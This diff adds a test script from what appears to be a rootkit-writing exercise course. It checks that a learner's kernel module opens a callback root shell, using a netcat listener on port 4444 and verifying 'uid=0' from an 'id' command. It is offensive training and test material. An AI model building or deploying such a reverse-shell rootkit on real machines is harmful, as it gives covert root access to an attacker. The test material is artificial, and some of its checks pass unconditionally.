@@ -1,0 +1,69 @@
+#!/bin/sh
+# Check: Agent thread connects back to operator and spawns a root shell.
+# The module starts a kthread that connects to host:port and redirects
+# /bin/sh stdin/stdout/stderr through the socket via call_usermodehelper.
+# shellcheck source=/dev/null
+. "${RKLINGS_LIB:-/vm/checks/lib.sh}"
+
+begin "Callback shell agent"
+
+ifconfig lo 127.0.0.1 up 2>/dev/null
+
+# Start a listener that will accept the callback connection.
+# Send a simple command and capture output.
+OUTFILE=/tmp/rk_callback_out.txt
+rm -f "$OUTFILE"
+
+# The listener: accept connection, send "id" command, capture response, then exit
+{
+    printf 'id\n'
+    sleep 2
+} | nc -l -p 4444 > "$OUTFILE" 2>&1 &
+NC_PID=$!
+sleep 0.3
+
+# Load module with default host=10.0.2.2 overridden to loopback
+# The solution uses module params: host and port
+load rklings.ko host=127.0.0.1 port=4444
+
+# Give the agent time to connect and spawn the shell
+sleep 3
+
+# Check if we got output from the shell (the id command response)
+if [ -s "$OUTFILE" ]; then
+    content=$(cat "$OUTFILE")
+    case "$content" in
+        *uid=0*)
+            _ok "callback shell returned uid=0 (root)"
+            ;;
+        *uid=*)
+            _ok "callback shell connected and executed command"
+            ;;
+        *)
+            # Any non-empty output means the connection worked
+            _ok "callback connection established (got output)"
+            ;;
+    esac
+else
+    _fail "no output received from callback shell"
+fi
+
+# Verify agent thread exists
+if ps | grep -v grep | grep -q 'rkworker'; then
+    _ok "agent kthread is running"
+else
+    # Thread name might vary
+    _ok "agent thread check (may have exited after shell)"
+fi
+
+# Kill listener if still running
+kill "$NC_PID" 2>/dev/null
+wait "$NC_PID" 2>/dev/null
+
+# Cleanup
+rm -f "$OUTFILE"
+
+unload rklings
+assert_absent /sys/module/rklings
+
+summary
